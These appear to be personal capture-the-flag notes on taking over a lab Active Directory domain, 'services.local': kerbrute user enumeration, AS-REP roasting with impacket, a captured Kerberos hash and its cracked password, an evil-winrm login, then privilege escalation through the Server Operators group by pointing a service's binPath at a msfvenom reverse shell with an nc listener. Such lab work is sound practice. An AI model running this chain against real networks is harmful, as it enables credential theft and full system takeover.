# Notes & Spam

j.doe@services.local


Joanne Doe
Jack Rock
Will Masters
Johnny LaRusso


$krb5asrep$23$j.rock@SERVICES.LOCAL:4d57e9c723afbbf915fdb39460cf344f$15fe09284d717914859a2c11ac9d5a7e41f9f1cf37128ab9daf25de49796153718aa4457486c7ec207631043898e75e450bb09640db2e6b119a18320e76cd369cfe146ba74f329e32ae104a66a52daa27ffef1423137cb08d4ac8e310ebf0af74383e235b9fae4ed6c14af969dc37d098431a10110a3b717d629d46e5bb52212ee379ff229532872257e62982389ebe23c30f0b08b16fad9fa00a4bae06a8fe7976f019f4a6e9cda847d722bbbd212d489677232a958907ee4870d22f559088d8b6f610654d5e23cb5b37862e3eea5847324daebf3f2eabd65b77ddca210776c77c596726f8b3f5f80f7ba238b0ea70f

found valid usernames with kerbrute. found users from here http://10.10.171.213/about.html

```bash
kerbrute userenum generated_users.txt --dc $target -d services.local
```

j.rock vulnerable to asreproast.

```bash
impacket-GetNPUsers services.local/ -dc-ip $target -usersfile generated_users.txt -outputfile hashes.txt
```

Cracked hash:
`Serviceworks1    ($krb5asrep$23$j.rock@SERVICES.LOCAL)`

```bash
evil-winrm -u j.rock -p Serviceworks1 -i $target
```

Creds:
valid usernames:
```
2025/06/12 08:25:58 >  [+] VALID USERNAME:       j.doe@services.local
2025/06/12 08:25:58 >  [+] VALID USERNAME:       w.masters@services.local
2025/06/12 08:25:58 >  [+] VALID USERNAME:       j.rock@services.local
2025/06/12 08:25:58 >  [+] VALID USERNAME:       j.larusso@services.local
```

`Serviceworks1    ($krb5asrep$23$j.rock@SERVICES.LOCAL)`

Privesc:

We're in group Server Operators. That allows us to run 'services' and manipulate the service executable associated with the service. If that service is running as localsystem, we will get a shell in that context. Just run 'sc.exe qc service_name' and if you see localsystem, you're good to go.

Windows:
```
services
sc.exe config VMTools binPath="C:\Users\j.rock\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

Kali:
```bash
msfvenom -p windows/x64/shell/reverse_tcp lhost=tun0 lport=443 -f exe > shell.exe
nc -lvnp 443
```

Service running as system, so our new shell will be under that context. From here you can now dump hashes with mimikatz or netexec or whatever you want.
